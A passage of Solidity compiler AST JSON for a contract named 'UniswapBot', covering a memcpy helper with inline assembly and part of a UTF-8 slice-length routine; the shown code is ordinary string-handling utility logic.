															"argumentTypes": null,
															"id": 443,
															"name": "len",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 437,
															"src": "5519:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "-=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "3332",
															"id": 444,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5526:2:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_32_by_1",
																"typeString": "int_const 32"
															},
															"value": "32"
														},
														"src": "5519:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 446,
													"nodeType": "ExpressionStatement",
													"src": "5519:9:0"
												},
												"nodeType": "ForStatement",
												"src": "5502:170:0"
											},
											{
												"assignments": [
													459
												],
												"declarations": [
													{
														"constant": false,
														"id": 459,
														"mutability": "mutable",
														"name": "mask",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 470,
														"src": "5717:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 458,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5717:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 468,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 467,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 465,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "323536",
															"id": 460,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5729:3:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_256_by_1",
																"typeString": "int_const 256"
															},
															"value": "256"
														},
														"nodeType": "BinaryOperation",
														"operator": "**",
														"rightExpression": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 463,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"hexValue": "3332",
																		"id": 461,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "5737:2:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_32_by_1",
																			"typeString": "int_const 32"
																		},
																		"value": "32"
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 462,
																		"name": "len",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 437,
																		"src": "5742:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "5737:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 464,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "5736:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "5729:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 466,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5749:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "5729:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5717:33:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "5770:168:0",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "5785:41:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "src",
																				"nodeType": "YulIdentifier",
																				"src": "5810:3:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "5804:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5804:10:0"
																	},
																	{
																		"arguments": [
																			{
																				"name": "mask",
																				"nodeType": "YulIdentifier",
																				"src": "5820:4:0"
																			}
																		],
																		"functionName": {
																			"name": "not",
																			"nodeType": "YulIdentifier",
																			"src": "5816:3:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5816:9:0"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "5800:3:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "5800:26:0"
															},
															"variables": [
																{
																	"name": "srcpart",
																	"nodeType": "YulTypedName",
																	"src": "5789:7:0",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "5840:38:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dest",
																				"nodeType": "YulIdentifier",
																				"src": "5866:4:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "5860:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5860:11:0"
																	},
																	{
																		"name": "mask",
																		"nodeType": "YulIdentifier",
																		"src": "5873:4:0"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "5856:3:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "5856:22:0"
															},
															"variables": [
																{
																	"name": "destpart",
																	"nodeType": "YulTypedName",
																	"src": "5844:8:0",
																	"type": ""
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "dest",
																		"nodeType": "YulIdentifier",
																		"src": "5899:4:0"
																	},
																	{
																		"arguments": [
																			{
																				"name": "destpart",
																				"nodeType": "YulIdentifier",
																				"src": "5908:8:0"
																			},
																			{
																				"name": "srcpart",
																				"nodeType": "YulIdentifier",
																				"src": "5918:7:0"
																			}
																		],
																		"functionName": {
																			"name": "or",
																			"nodeType": "YulIdentifier",
																			"src": "5905:2:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5905:21:0"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "5892:6:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "5892:35:0"
															},
															"nodeType": "YulExpressionStatement",
															"src": "5892:35:0"
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 433,
														"isOffset": false,
														"isSlot": false,
														"src": "5866:4:0",
														"valueSize": 1
													},
													{
														"declaration": 433,
														"isOffset": false,
														"isSlot": false,
														"src": "5899:4:0",
														"valueSize": 1
													},
													{
														"declaration": 459,
														"isOffset": false,
														"isSlot": false,
														"src": "5820:4:0",
														"valueSize": 1
													},
													{
														"declaration": 459,
														"isOffset": false,
														"isSlot": false,
														"src": "5873:4:0",
														"valueSize": 1
													},
													{
														"declaration": 435,
														"isOffset": false,
														"isSlot": false,
														"src": "5810:3:0",
														"valueSize": 1
													}
												],
												"id": 469,
												"nodeType": "InlineAssembly",
												"src": "5761:177:0"
											}
										]
									},
									"documentation": null,
									"id": 471,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "memcpy",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 438,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 433,
												"mutability": "mutable",
												"name": "dest",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 471,
												"src": "5409:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 432,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5409:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 435,
												"mutability": "mutable",
												"name": "src",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 471,
												"src": "5420:8:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 434,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5420:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 437,
												"mutability": "mutable",
												"name": "len",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 471,
												"src": "5430:8:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 436,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5430:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5408:31:0"
									},
									"returnParameters": {
										"id": 439,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5453:0:0"
									},
									"scope": 1578,
									"src": "5393:552:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 617,
										"nodeType": "Block",
										"src": "6220:1055:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 481,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 478,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 473,
															"src": "6235:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 479,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 21,
														"src": "6235:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 480,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6248:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "6235:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 485,
												"nodeType": "IfStatement",
												"src": "6231:55:0",
												"trueBody": {
													"id": 484,
													"nodeType": "Block",
													"src": "6251:35:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 482,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6273:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 477,
															"id": 483,
															"nodeType": "Return",
															"src": "6266:8:0"
														}
													]
												}
											},
											{
												"assignments": [
													487
												],
												"declarations": [
													{
														"constant": false,
														"id": 487,
														"mutability": "mutable",
														"name": "word",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 617,
														"src": "6298:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 486,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6298:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 488,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "6298:9:0"
											},
											{
												"assignments": [
													490
												],
												"declarations": [
													{
														"constant": false,
														"id": 490,
														"mutability": "mutable",
														"name": "length",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 617,
														"src": "6318:11:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 489,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6318:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 491,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "6318:11:0"
											},
											{
												"assignments": [
													493
												],
												"declarations": [
													{
														"constant": false,
														"id": 493,
														"mutability": "mutable",
														"name": "divisor",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 617,
														"src": "6340:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 492,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6340:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 497,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_rational_452312848583266388373324160190187140051835877600158453279131187530910662656_by_1",
														"typeString": "int_const 4523...(67 digits omitted)...2656"
													},
													"id": 496,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"hexValue": "32",
														"id": 494,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6355:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_2_by_1",
															"typeString": "int_const 2"
														},
														"value": "2"
													},
													"nodeType": "BinaryOperation",
													"operator": "**",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "323438",
														"id": 495,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6360:3:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_248_by_1",
															"typeString": "int_const 248"
														},
														"value": "248"
													},
													"src": "6355:8:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_452312848583266388373324160190187140051835877600158453279131187530910662656_by_1",
														"typeString": "int_const 4523...(67 digits omitted)...2656"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6340:23:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "6430:38:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "6432:34:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "self",
																						"nodeType": "YulIdentifier",
																						"src": "6455:4:0"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "6461:2:0",
																						"type": "",
																						"value": "32"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "6451:3:0"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "6451:13:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "6445:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "6445:20:0"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "6439:5:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "6439:27:0"
															},
															"variableNames": [
																{
																	"name": "word",
																	"nodeType": "YulIdentifier",
																	"src": "6432:4:0"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 473,
														"isOffset": false,
														"isSlot": false,
														"src": "6455:4:0",
														"valueSize": 1
													},
													{
														"declaration": 487,
														"isOffset": false,
														"isSlot": false,
														"src": "6432:4:0",
														"valueSize": 1
													}
												],
												"id": 498,
												"nodeType": "InlineAssembly",
												"src": "6421:47:0"
											},
											{
												"assignments": [
													500
												],
												"declarations": [
													{
														"constant": false,
														"id": 500,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 617,
														"src": "6478:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 499,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6478:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 504,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 503,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 501,
														"name": "word",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 487,
														"src": "6487:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 502,
														"name": "divisor",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 493,
														"src": "6494:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6487:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6478:23:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 507,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 505,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 500,
														"src": "6516:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30783830",
														"id": 506,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6520:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_128_by_1",
															"typeString": "int_const 128"
														},
														"value": "0x80"
													},
													"src": "6516:8:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 519,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 517,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 500,
															"src": "6594:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30784530",
															"id": 518,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6598:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_224_by_1",
																"typeString": "int_const 224"
															},
															"value": "0xE0"
														},
														"src": "6594:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 533,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 531,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 500,
																"src": "6679:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30784630",
																"id": 532,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6683:4:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_240_by_1",
																	"typeString": "int_const 240"
																},
																"value": "0xF0"
															},
															"src": "6679:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"id": 555,
															"nodeType": "Block",
															"src": "6761:66:0",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 549,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 545,
																			"name": "ret",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 476,
																			"src": "6776:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 548,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 546,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 500,
																				"src": "6782:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "&",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30783037",
																				"id": 547,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "6786:4:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_7_by_1",
																					"typeString": "int_const 7"
																				},
																				"value": "0x07"
																			},
																			"src": "6782:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "6776:14:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 550,
																	"nodeType": "ExpressionStatement",
																	"src": "6776:14:0"
																},
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 553,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 551,
																			"name": "length",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 490,
																			"src": "6805:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "34",
																			"id": 552,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6814:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_4_by_1",
																				"typeString": "int_const 4"
																			},
																			"value": "4"
																		},
																		"src": "6805:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 554,
																	"nodeType": "ExpressionStatement",
																	"src": "6805:10:0"
																}
															]
														},
														"id": 556,
														"nodeType": "IfStatement",
														"src": "6676:151:0",
														"trueBody": {
															"id": 544,
															"nodeType": "Block",
															"src": "6689:66:0",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 538,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 534,
																			"name": "ret",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 476,
																			"src": "6704:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 537,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 535,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 500,
																				"src": "6710:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "&",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30783046",
																				"id": 536,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "6714:4:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_15_by_1",
																					"typeString": "int_const 15"
																				},
																				"value": "0x0F"
																			},
																			"src": "6710:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "6704:14:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 539,
																	"nodeType": "ExpressionStatement",
																	"src": "6704:14:0"
																},
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 542,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 540,
																			"name": "length",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 490,
																			"src": "6733:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "33",
																			"id": 541,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6742:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_3_by_1",
																				"typeString": "int_const 3"
																			},
																			"value": "3"
																		},
																		"src": "6733:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 543,
																	"nodeType": "ExpressionStatement",
																	"src": "6733:10:0"
																}
															]
														}
													},
													"id": 557,
													"nodeType": "IfStatement",
													"src": "6591:236:0",
													"trueBody": {
														"id": 530,
														"nodeType": "Block",
														"src": "6604:66:0",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 524,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 520,
																		"name": "ret",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 476,
																		"src": "6619:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
